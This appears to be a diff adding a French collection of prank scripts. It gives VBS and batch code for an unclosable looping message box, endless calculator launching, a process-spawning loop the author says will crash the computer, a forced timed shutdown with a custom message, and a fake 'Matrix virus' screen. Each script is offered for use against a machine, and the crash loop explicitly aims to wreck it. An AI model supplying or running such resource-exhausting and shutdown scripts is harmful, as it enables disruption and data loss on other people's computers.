@@ -1,0 +1,53 @@
+1 Message impossible a fermer :
+..........................................................
+do
+msgbox " LE TEXTE QUE VOUS VOULLEZ "
+loop
+
+"enregistrer en .vbs "
+....................................
+2 calculettes infinie :
+....................................
+@echo off
+:menu
+start calc.exe
+start sol.exe
+start calc.exe
+start calc.exe
+start calc.exe
+goto :menu
+
+"enregistrer en .bat"
+...........................................
+3 faire planter l'ordi :
+...............................................
+@echo off
+start calc.exe
+
+"vous le copier coller env 500 fois pour bien tout niquer"
+
+ou alor vous faite
+
+@echo off
+:debut
+start calc.exe
+start cmd.exe
+goto :debut
+.................................
+4 Eteindre l'ordi :
+....................................
+@echo off
+shutdown -s -t 30 -c "LE TEXTE QUE VOUS VOULEZ"
+
+"enregistrer en .bat"
+.........................................
+5 virus matrix :
+......................................
+@echo off
+color a
+title Virus MATRIX
+:menu
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+goto :menu
+
+"enregistrer en .bat"
